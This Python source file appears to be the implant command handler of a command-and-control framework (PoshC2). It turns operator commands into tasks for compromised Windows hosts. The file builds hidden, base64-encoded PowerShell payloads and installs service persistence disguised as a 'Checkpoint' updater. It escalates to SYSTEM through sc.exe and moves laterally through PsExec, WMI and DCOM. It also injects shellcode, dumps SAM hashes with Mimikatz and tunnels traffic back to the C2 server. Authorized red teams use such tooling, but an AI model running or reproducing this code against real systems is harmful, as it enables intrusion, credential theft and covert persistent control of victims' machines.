import base64, re, traceback, os, sys, readline
from Alias import ps_alias
from Colours import Colours
from Utils import validate_sleep_time
from DB import new_task, update_sleep, get_history, select_item, update_label, unhide_implant, kill_implant, get_implantdetails, get_c2server_all, get_newimplanturl, get_allurls, get_sharpurls
from AutoLoads import check_module_loaded, run_autoloads
from Help import COMMANDS, posh_help, posh_help1, posh_help2, posh_help3, posh_help4, posh_help5, posh_help6, posh_help7, posh_help8
from Config import PayloadsDirectory, POSHDIR, ROOTDIR, SocksHost
from Core import readfile_with_completion, shellcodefilecomplete
from Opsec import ps_opsec
from Payloads import Payloads
from Utils import argp, load_file, gen_key
from TabComplete import tabCompleter

if os.name == 'nt':
    import pyreadline.rlmain


def handle_ps_command(command, user, randomuri, startup, createdaisypayload, createproxypayload):

    try:
        check_module_loaded("Stage2-Core.ps1", randomuri, user)
    except Exception as e:
        print("Error loading Stage2-Core.ps1: %s" % e)

    # alias mapping
    for alias in ps_alias:
        if command.startswith(alias[0]):
            command.replace(alias[0], alias[1])

    command = command.strip()

    run_autoloads(command, randomuri, user)

    # opsec failures
    for opsec in ps_opsec:
        if opsec == command[:len(opsec)]:
            print(Colours.RED)
            print("**OPSEC Warning**")
            impid = get_implantdetails(randomuri)
            ri = input("Do you want to continue running - %s? (y/N) " % command)
            if ri.lower() == "n":
                command = ""
            if ri == "":
                command = ""
            break

    if command.startswith("beacon") or command.startswith("set-beacon") or command.startswith("setbeacon"):
        new_sleep = command.replace('set-beacon ', '')
        new_sleep = new_sleep.replace('setbeacon ', '')
        new_sleep = new_sleep.replace('beacon ', '').strip()
        if not validate_sleep_time(new_sleep):
            print(Colours.RED)
            print("Invalid sleep command, please specify a time such as 50s, 10m or 1h")
            print(Colours.GREEN)
        else:
            new_task(command, user, randomuri)
            update_sleep(new_sleep, randomuri)

    elif (command.startswith('label-implant')):
        label = command.replace('label-implant ', '')
        update_label(label, randomuri)
        startup(user)

    elif command.startswith("searchhelp"):
        searchterm = (command).replace("searchhelp ", "")
        helpful = posh_help.split('\n')
        for line in helpful:
            if searchterm in line.lower():
                print(line)

    elif (command == "back") or (command == "clear"):
        startup(user)

    elif command.startswith("install-servicelevel-persistencewithproxy"):
        C2 = get_c2server_all()
        if C2[11] == "":
            startup(user, "Need to run createproxypayload first")
        else:
            newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
                                  C2[13], C2[11], "", "", C2[19], C2[20],
                                  C2[21], "%s?p" % get_newimplanturl(), PayloadsDirectory)
            payload = newPayload.CreateRawBase()
            cmd = "sc.exe create CPUpdater binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceUpdater start= auto" % (payload)
            new_task(cmd, user, randomuri)

    elif command.startswith("install-servicelevel-persistence"):
        C2 = get_c2server_all()
        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
                              "", "", "", "", C2[19], C2[20],
                              C2[21], get_newimplanturl(), PayloadsDirectory)
        payload = newPayload.CreateRawBase()
        cmd = "sc.exe create CPUpdater binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceUpdater start= auto" % (payload)
        new_task(cmd, user, randomuri)

    elif command.startswith("remove-servicelevel-persistence"):
        new_task("sc.exe delete CPUpdater", user, randomuri)

    # psexec lateral movement
    elif command.startswith("get-implantworkingdirectory"):
        new_task("pwd", user, randomuri)

    elif command.startswith("get-system-withproxy"):
        C2 = get_c2server_all()
        if C2[11] == "":
            startup(user, "Need to run createproxypayload first")
        else:
            newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
                                  C2[13], C2[11], "", "", C2[19], C2[20],
                                  C2[21], "%s?p" % get_newimplanturl(), PayloadsDirectory)
            payload = newPayload.CreateRawBase()
            cmd = "sc.exe create CPUpdaterMisc binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceModule start= auto" % payload
            new_task(cmd, user, randomuri)
            cmd = "sc.exe start CPUpdaterMisc"
            new_task(cmd, user, randomuri)
            cmd = "sc.exe delete CPUpdaterMisc"
            new_task(cmd, user, randomuri)

    elif command.startswith("get-system-withdaisy"):
        C2 = get_c2server_all()
        daisyname = input("Payload name required: ")
        if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, daisyname))):
            with open("%s%spayload.bat" % (PayloadsDirectory, daisyname), "r") as p:
                payload = p.read()
            cmd = "sc.exe create CPUpdaterMisc binpath= 'cmd /c %s' Displayname= CheckpointServiceModule start= auto" % payload
            new_task(cmd, user, randomuri)
            cmd = "sc.exe start CPUpdaterMisc"
            new_task(cmd, user, randomuri)
            cmd = "sc.exe delete CPUpdaterMisc"
            new_task(cmd, user, randomuri)

    elif command.startswith("get-system"):
        C2 = get_c2server_all()
        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
                              "", "", "", "", C2[19], C2[20],
                              C2[21], get_newimplanturl(), PayloadsDirectory)
        payload = newPayload.CreateRawBase()
        cmd = "sc.exe create CPUpdaterMisc binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceModule start= auto" % payload
        new_task(cmd, user, randomuri)
        cmd = "sc.exe start CPUpdaterMisc"
        new_task(cmd, user, randomuri)
        cmd = "sc.exe delete CPUpdaterMisc"
        new_task(cmd, user, randomuri)

    elif command == "quit":
        ri = input("Are you sure you want to quit? (Y/n) ")
        if ri.lower() == "n":
            startup(user)
        if ri == "":
            sys.exit(0)
        if ri.lower() == "y":
            sys.exit(0)

    elif command.startswith("invoke-psexecproxypayload"):
        check_module_loaded("Invoke-PsExec.ps1", randomuri, user)
        if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, "Proxy"))):
            with open("%s%spayload.bat" % (PayloadsDirectory, "Proxy"), "r") as p:
                payload = p.read()
            params = re.compile("invoke-psexecproxypayload ", re.IGNORECASE)
            params = params.sub("", command)
            cmd = "invoke-psexec %s -command \"%s\"" % (params, payload)
            new_task(cmd, user, randomuri)
        else:
            startup(user, "Need to run createproxypayload first")

    elif command.startswith("invoke-psexecdaisypayload"):
        check_module_loaded("Invoke-PsExec.ps1", randomuri, user)
        daisyname = input("Payload name required: ")
        if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, daisyname))):
            with open("%s%spayload.bat" % (PayloadsDirectory, daisyname), "r") as p:
                payload = p.read()
            params = re.compile("invoke-psexecdaisypayload ", re.IGNORECASE)
            params = params.sub("", command)
            cmd = "invoke-psexec %s -command \"%s\"" % (params, payload)
            new_task(cmd, user, randomuri)
        else:
            startup(user, "Need to run createdaisypayload first")

    elif command.startswith("invoke-psexecpayload"):
        check_module_loaded("Invoke-PsExec.ps1", randomuri, user)
        C2 = get_c2server_all()
        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
                              "", "", "", "", C2[19], C2[20],
                              C2[21], get_newimplanturl(), PayloadsDirectory)
        payload = newPayload.CreateRawBase()
        params = re.compile("invoke-psexecpayload ", re.IGNORECASE)
        params = params.sub("", command)
        cmd = "invoke-psexec %s -command \"powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\"" % (params, payload)
        new_task(cmd, user, randomuri)

    # wmi lateral movement
    elif command.startswith("invoke-wmiproxypayload"):
        check_module_loaded("Invoke-WMIExec.ps1", randomuri, user)
        if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, "Proxy"))):
            with open("%s%spayload.bat" % (PayloadsDirectory, "Proxy"), "r") as p:
                payload = p.read()
            params = re.compile("invoke-wmiproxypayload ", re.IGNORECASE)
            params = params.sub("", command)
            cmd = "invoke-wmiexec %s -command \"%s\"" % (params, payload)
            new_task(cmd, user, randomuri)
        else:
            startup(user, "Need to run createproxypayload first")

    elif command.startswith("invoke-wmidaisypayload"):
        check_module_loaded("Invoke-WMIExec.ps1", randomuri, user)
        daisyname = input("Name required: ")
        if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, daisyname))):
            with open("%s%spayload.bat" % (PayloadsDirectory, daisyname), "r") as p:
                payload = p.read()
            params = re.compile("invoke-wmidaisypayload ", re.IGNORECASE)
            params = params.sub("", command)
            cmd = "invoke-wmiexec %s -command \"%s\"" % (params, payload)
            new_task(cmd, user, randomuri)
        else:
            startup(user, "Need to run createdaisypayload first")

    elif command.startswith("invoke-wmipayload"):
        check_module_loaded("Invoke-WMIExec.ps1", randomuri, user)
        C2 = get_c2server_all()
        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
                              "", "", "", "", C2[19], C2[20],
                              C2[21], get_newimplanturl(), PayloadsDirectory)
        payload = newPayload.CreateRawBase()
        params = re.compile("invoke-wmipayload ", re.IGNORECASE)
        params = params.sub("", command)
        cmd = "invoke-wmiexec %s -command \"powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\"" % (params, payload)
        new_task(cmd, user, randomuri)

    # dcom lateral movement
    elif command.startswith("invoke-dcomproxypayload"):
        if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, "Proxy"))):
            with open("%s%spayload.bat" % (PayloadsDirectory, "Proxy"), "r") as p:
                payload = p.read()
            params = re.compile("invoke-wmiproxypayload ", re.IGNORECASE)
            params = params.sub("", command)
            p = re.compile(r'(?<=-target.).*')
            target = re.search(p, command).group()
            pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\cmd.exe\",$null,\"/c %s\",\"7\")" % (target, payload)
            new_task(pscommand, user, randomuri)
        else:
            startup(user, "Need to run createproxypayload first")

    elif command.startswith("invoke-dcomdaisypayload"):
        daisyname = input("Name required: ")
        if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, daisyname))):
            with open("%s%spayload.bat" % (PayloadsDirectory, daisyname), "r") as p:
                payload = p.read()
            p = re.compile(r'(?<=-target.).*')
            target = re.search(p, command).group()
            pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\cmd.exe\",$null,\"/c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\",\"7\")" % (target, payload)
            new_task(pscommand, user, randomuri)
        else:
            startup(user, "Need to run createdaisypayload first")

    elif command.startswith("invoke-dcompayload"):
        C2 = get_c2server_all()
        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
                              "", "", "", "", C2[19], C2[20],
                              C2[21], get_newimplanturl(), PayloadsDirectory)
        payload = newPayload.CreateRawBase()
        p = re.compile(r'(?<=-target.).*')
        target = re.search(p, command).group()
        pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\cmd.exe\",$null,\"/c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\",\"7\")" % (target, payload)
        new_task(pscommand, user, randomuri)

    # runas payloads
    elif command.startswith("invoke-runasdaisypayload"):
        daisyname = input("Name required: ")
        if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, daisyname))):
            with open("%s%spayload.bat" % (PayloadsDirectory, daisyname), "r") as p:
                payload = p.read()
            new_task("$proxypayload = \"%s\"" % payload, user, randomuri)
            check_module_loaded("Invoke-RunAs.ps1", randomuri, user)
            check_module_loaded("NamedPipeDaisy.ps1", randomuri, user)
            params = re.compile("invoke-runasdaisypayload ", re.IGNORECASE)
            params = params.sub("", command)
            pipe = "add-Type -assembly System.Core; $pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSDaisy'); $pi.Connect(); $pr = new-object System.IO.StreamReader($pi); iex $pr.ReadLine();"
            pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params, base64.b64encode(pipe.encode('UTF-16LE')).decode("utf-8"))
            new_task(pscommand, user, randomuri)
        else:
            startup(user, "Need to run createdaisypayload first")

    elif command.startswith("invoke-runasproxypayload"):
        C2 = get_c2server_all()
        if C2[11] == "":
            startup(user, "Need to run createproxypayload first")
        else:
            newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
                                  C2[13], C2[11], "", "", C2[19], C2[20],
                                  C2[21], "%s?p" % get_newimplanturl(), PayloadsDirectory)
            payload = newPayload.CreateRawBase()
            proxyvar = "$proxypayload = \"powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\"" % payload
            new_task(proxyvar, user, randomuri)
            check_module_loaded("Invoke-RunAs.ps1", randomuri, user)
            check_module_loaded("NamedPipeProxy.ps1", randomuri, user)
            params = re.compile("invoke-runasproxypayload ", re.IGNORECASE)
            params = params.sub("", command)
            pipe = "add-Type -assembly System.Core; $pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSProxy'); $pi.Connect(); $pr = new-object System.IO.StreamReader($pi); iex $pr.ReadLine();"
            pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params, base64.b64encode(pipe.encode('UTF-16LE')).decode("utf-8"))
            new_task(pscommand, user, randomuri)

    elif command.startswith("invoke-runaspayload"):
        check_module_loaded("Invoke-RunAs.ps1", randomuri, user)
        check_module_loaded("NamedPipe.ps1", randomuri, user)
        params = re.compile("invoke-runaspayload ", re.IGNORECASE)
        params = params.sub("", command)
        pipe = "add-Type -assembly System.Core; $pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMS'); $pi.Connect(); $pr = new-object System.IO.StreamReader($pi); iex $pr.ReadLine();"
        pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params, base64.b64encode(pipe.encode('UTF-16LE')).decode("utf-8"))
        new_task(pscommand, user, randomuri)

    elif command == "help" or command == "?":
        print(posh_help)
    elif command == "help 1":
        print(posh_help1)
    elif command == "help 2":
        print(posh_help2)
    elif command == "help 3":
        print(posh_help3)
    elif command == "help 4":
        print(posh_help4)
    elif command == "help 5":
        print(posh_help5)
    elif command == "help 6":
        print(posh_help6)
    elif command == "help 7":
        print(posh_help7)
    elif command == "help 8":
        print(posh_help8)

    elif command.startswith("get-pid"):
        pid = get_implantdetails(randomuri)
        print(pid[8])

    elif command.startswith("upload-file"):
        source = ""
        destination = ""
        s = ""
        nothidden = False
        if command == "upload-file":
            source = readfile_with_completion("Location of file to upload: ")
            while not os.path.isfile(source):
                print("File does not exist: %s" % source)
                source = readfile_with_completion("Location of file to upload: ")
            destination = input("Location to upload to: ")
        else:
            args = argp(command)
            source = args.source
            destination = args.destination
            nothidden = args.nothidden
        try:
            with open(source, "rb") as source_file:
                s = source_file.read()
            if s:
                sourceb64 = base64.b64encode(s).decode("utf-8")
                destination = destination.replace("\\", "\\\\")
                print("")
                print("Uploading %s to %s" % (source, destination))
                if (nothidden):
                    uploadcommand = "Upload-File -Destination \"%s\" -NotHidden %s -Base64 %s" % (destination, nothidden, sourceb64)
                else:
                    uploadcommand = "Upload-File -Destination \"%s\" -Base64 %s" % (destination, sourceb64)
                new_task(uploadcommand, user, randomuri)
            else:
                print("Source file could not be read or was empty")
        except Exception as e:
            print("Error with source file: %s" % e)
            traceback.print_exc()

    elif command == "kill-implant" or command == "exit":
        impid = get_implantdetails(randomuri)
        ri = input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid[0])
        if ri.lower() == "n":
            print("Implant not terminated")
        if ri == "":
            new_task("exit", user, randomuri)
            kill_implant(randomuri)
        if ri.lower() == "y":
            new_task("exit", user, randomuri)
            kill_implant(randomuri)

    elif command.startswith("unhide-implant"):
        unhide_implant(randomuri)

    elif command.startswith("hide-implant"):
        kill_implant(randomuri)

    elif command.startswith("migrate"):
        params = re.compile("migrate", re.IGNORECASE)
        params = params.sub("", command)
        migrate(randomuri, user, params)

    elif command.startswith("loadmoduleforce"):
        params = re.compile("loadmoduleforce ", re.IGNORECASE)
        params = params.sub("", command)
        check_module_loaded(params, randomuri, user, force=True)

    elif command.startswith("loadmodule"):
        params = re.compile("loadmodule ", re.IGNORECASE)
        params = params.sub("", command)
        check_module_loaded(params, randomuri, user)

    elif command.startswith("invoke-daisychain"):
        check_module_loaded("Invoke-DaisyChain.ps1", randomuri, user)
        urls = get_allurls()
        new_task("%s -URLs '%s'" % (command, urls), user, randomuri)
        print("Now use createdaisypayload")

    elif command.startswith("inject-shellcode"):
        params = re.compile("inject-shellcode", re.IGNORECASE)
        params = params.sub("", command)
        check_module_loaded("Inject-Shellcode.ps1", randomuri, user)
        readline.set_completer(shellcodefilecomplete)
        path = input("Location of shellcode file: ")
        t = tabCompleter()
        t.createListCompleter(COMMANDS)
        readline.set_completer(t.listCompleter)
        try:
            shellcodefile = load_file(path)
            if shellcodefile is not None:
                arch = "64"
                new_task("$Shellcode%s=\"%s\" #%s" % (arch, base64.b64encode(shellcodefile).decode("utf-8"), os.path.basename(path)), user, randomuri)
                new_task("Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode%s))%s" % (arch, params), user, randomuri)
        except Exception as e:
            print("Error loading file: %s" % e)

    elif command == "listmodules":
        print(os.listdir("%s/Modules/" % POSHDIR))

    elif command == "modulesloaded":
        ml = get_implantdetails(randomuri)
        print(ml[14])

    elif command == "ps":
        new_task("get-processlist", user, randomuri)

    elif command == "hashdump":
        check_module_loaded("Invoke-Mimikatz.ps1", randomuri, user)
        new_task("Invoke-Mimikatz -Command '\"lsadump::sam\"'", user, randomuri)

    elif command == "sharpsocks":
        check_module_loaded("SharpSocks.ps1", randomuri, user)
        import string
        from random import choice
        allchar = string.ascii_letters
        channel = "".join(choice(allchar) for x in range(25))
        sharpkey = gen_key().decode("utf-8")
        sharpurls = get_sharpurls()
        sharpurl = select_item("HostnameIP", "C2Server")
        sharpport = select_item("ServerPort", "C2Server")
        if (sharpport != 80 and sharpport != 443):
            if (sharpurl.count("/") >= 3):
                pat = re.compile(r"(?<!/)/(?!/)")
                sharpurl = pat.sub(":%s/" % sharpport, str, 1)
            else:
                sharpurl = ("%s:%s" % (sharpurl, sharpport))

        print(POSHDIR + "SharpSocks/SharpSocksServerCore -c=%s -k=%s --verbose -l=%s\r\n" % (channel, sharpkey, SocksHost) + Colours.GREEN)
        ri = input("Are you ready to start the SharpSocks in the implant? (Y/n) ")
        if ri.lower() == "n":
            print("")
        if ri == "":
            new_task("Sharpsocks -Client -Uri %s -Channel %s -Key %s -URLs %s -Insecure -Beacon 1000" % (sharpurl, channel, sharpkey, sharpurls), user, randomuri)
        if ri.lower() == "y":
            new_task("Sharpsocks -Client -Uri %s -Channel %s -Key %s -URLs %s -Insecure -Beacon 1000" % (sharpurl, channel, sharpkey, sharpurls), user, randomuri)
        update_label("SharpSocks", randomuri)

    elif command == "history":
        startup(user, get_history())

    elif command.startswith("reversedns"):
        params = re.compile("reversedns ", re.IGNORECASE)
        params = params.sub("", command)
        new_task("[System.Net.Dns]::GetHostEntry(\"%s\")" % params, user, randomuri)

    elif command.startswith("createdaisypayload"):
        createdaisypayload(user, startup)

    elif command.startswith("createproxypayload"):
        createproxypayload(user, startup)

    elif command.startswith("createnewpayload"):
        createproxypayload(user, startup)

    else:
        if command:
            new_task(command, user, randomuri)
        return


def migrate(randomuri, user, params=""):
    implant = get_implantdetails(randomuri)
    implant_arch = implant[10]
    implant_comms = implant[15]

    if implant_arch == "AMD64":
        arch = "64"
    else:
        arch = "86"

    if implant_comms == "PS":
        path = "%spayloads/Posh_v4_x%s_Shellcode.bin" % (ROOTDIR, arch)
        shellcodefile = load_file(path)
    elif "Daisy" in implant_comms:
        daisyname = input("Name required: ")
        path = "%spayloads/%sPosh_v4_x%s_Shellcode.bin" % (ROOTDIR, daisyname, arch)
        shellcodefile = load_file(path)
    elif "Proxy" in implant_comms:
        path = "%spayloads/ProxyPosh_v4_x%s_Shellcode.bin" % (ROOTDIR, arch)
        shellcodefile = load_file(path)
    check_module_loaded("Inject-Shellcode.ps1", randomuri, user)
    new_task("$Shellcode%s=\"%s\" #%s" % (arch, base64.b64encode(shellcodefile).decode("utf-8"), os.path.basename(path)), user, randomuri)
    new_task("Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode%s))%s" % (arch, params), user, randomuri)
